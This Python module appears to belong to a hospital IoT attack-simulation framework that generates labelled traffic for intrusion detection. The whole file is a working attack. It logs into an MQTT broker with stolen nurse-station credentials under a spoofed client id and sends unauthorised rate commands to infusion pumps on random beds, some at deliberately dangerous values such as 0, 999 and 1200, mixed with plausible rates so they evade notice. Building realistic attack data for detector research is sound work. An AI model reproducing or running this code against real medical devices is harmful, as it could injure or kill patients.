"""pump_cmd: connect with stolen nurse-station credentials and send unauthorised infusion-pump
commands. Most are plausible rate changes within the range the nurse itself uses, with a
minority of clearly dangerous values; this makes the class realistically hard (the signal is
source identity + rate, not an obviously bad value every time). Each command's bed, rate and a
plausible flag are recorded into the run's params."""
import json
import time

import paho.mqtt.client as mqtt

from .creds import pick_creds
from .. import util

PLAUSIBLE = [75, 100, 125, 150]      # the rates the real nurse station uses
DANGEROUS = [0, 999, 1200]           # clearly out-of-range


def pump_cmd(ctx, params):
    duration = int(params.get("duration", 60))
    per_min = int(params.get("cmds_per_min", 10))
    dangerous_frac = float(params.get("dangerous_frac", 0.25))
    user, pw, src = pick_creds(ctx, "nurse")
    if not user:
        return {"outcome": "fail", "notes": "no nurse credentials available"}
    c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                    client_id=params.get("client_id", "mon-admin"))
    c.username_pw_set(user, pw)
    commands = []
    try:
        c.connect(ctx.broker_ip, 1883)
        c.loop_start()
        deadline = util.monotonic() + duration
        while util.monotonic() < deadline:
            bed = ctx.rng.randint(1, ctx.beds)
            dangerous = ctx.rng.random() < dangerous_frac
            rate = ctx.rng.choice(DANGEROUS if dangerous else PLAUSIBLE)
            c.publish(f"ward1/bed{bed}/pump/cmd",
                      json.dumps({"action": "set_rate", "rate": rate, "ts": util.utc_iso()}),
                      qos=0)
            commands.append({"bed": bed, "rate": rate, "plausible": not dangerous})
            time.sleep(60.0 / per_min)
        c.loop_stop()
        c.disconnect()
    except Exception as exc:
        return {"outcome": "fail", "notes": str(exc), "creds_source": src}
    n_dang = sum(1 for x in commands if not x["plausible"])
    return {"targets": [ctx.broker_ip], "creds_source": src,
            "params_out": {"commands": commands},
            "notes": f"sent {len(commands)} unauthorised pump commands as {user} ({src}); "
                     f"{len(commands) - n_dang} plausible-rate, {n_dang} dangerous"}


pump_cmd.STAGE = "abuse-stolen-creds"
